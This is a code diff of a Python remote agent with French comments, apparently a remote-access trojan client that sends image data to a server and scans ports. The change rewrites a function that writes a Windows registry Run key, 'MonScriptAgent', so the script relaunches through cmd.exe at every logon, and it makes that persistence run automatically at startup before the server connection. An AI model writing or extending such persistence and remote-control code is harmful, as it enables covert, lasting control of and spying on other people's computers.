@@ -75,27 +75,29 @@ def send_image_to_server(cs, image_bytes):
 
     cs.sendall(image_bytes)
 
+
 def add_persistence():
     """
     Ajoute une entrée au registre de Windows pour lancer automatiquement 'python agent.py' au démarrage.
     """
     try:
-        script_path = os.path.abspath(sys.argv[0])
+        python_path = sys.executable
 
-        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        reg_key = reg.HKEY_CURRENT_USER
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        script_name = os.path.basename(__file__)
 
-        with reg.ConnectRegistry(None, reg_key) as registry:
-            with reg.OpenKey(registry, key, 0, reg.KEY_SET_VALUE) as key:
-                app_name = "agent"
+        command = f'cmd.exe /c "cd /d {script_dir} && {python_path} {script_name}"'
 
-                python_path = sys.executable
-                command = f'"{python_path}" "{script_path}"'
-                print(command)
-                reg.SetValueEx(key, app_name, 0, reg.REG_SZ, command)
-                print(f"Persistance ajoutée : {app_name} démarrera automatiquement au démarrage.")
+        key = reg.HKEY_CURRENT_USER
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
+        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
+        reg.SetValueEx(reg_key, "MonScriptAgent", 0, reg.REG_SZ, command)
+        reg.CloseKey(reg_key)
+
+        print("[INFO] Script ajouté au démarrage de Windows.")
     except Exception as e:
-        print(f"Erreur lors de l'ajout de la persistance au registre : {e}")
+        print(f"[ERREUR] Impossible d'ajouter le script au démarrage : {e}")
 
 def connect_to_server():
     """
@@ -189,4 +191,5 @@ def scan_ports(start_port, end_port):
     return open_ports
 
 if __name__ == "__main__":
+    add_persistence()
     connect_to_server()
